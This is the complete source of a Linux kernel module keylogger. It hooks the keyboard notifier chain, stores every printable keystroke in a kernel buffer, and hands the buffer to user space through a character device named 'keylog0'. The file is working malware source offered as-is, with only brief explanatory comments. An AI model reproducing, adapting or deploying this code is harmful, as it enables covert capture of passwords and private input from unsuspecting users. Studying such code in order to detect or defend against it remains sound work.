//Kernel notifier keylogger Yonor & Elona
//
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>

#define DEVICE_NAME "keylog0"  // Name of the device
static int major;  // Major number for CHARDEV

// Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
int buf_pos = 0;  // Counting characters to avoid overflow

// Prototypes
static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain

// Setting the Device Driver read function
static struct file_operations fops = {
	.read = dev_read
};

// Initializing the notifier_block
static struct notifier_block nb = {
	.notifier_call = keys_pressed
};


static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
	
	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;
		
		// We will only log those key presses that actually represent an ASCII character. 
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) {
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}
		
		// Beware of buffer overflows in kernel space!! They can be catastrophic!
		//Prevents the OS to cracked in event of OVERFLOW
		if (buf_pos >= BUFFER_LEN) {
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}	
	return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
}

// Device driver read function
static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) {
	int len = strlen(keys_buffer);
	int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
	if (ret) {
		printk(KERN_INFO "Couldn't copy all data to user space\n");
		return ret;
	}
	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
	keys_bf_ptr = keys_buffer; // Reset buffer pointer
	return len;
}

static int __init keylog_init(void) {
	major = register_chrdev(0, DEVICE_NAME, &fops);
	if (major < 0) {
		printk(KERN_ALERT "keylog failed to register a major number\n");
		return major;
	}
	
	printk(KERN_INFO "Registered keylogger with major number %d", major);	
	
	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);
	return 0;
}

static void __exit keylog_exit(void) {
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger unloaded\n");
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");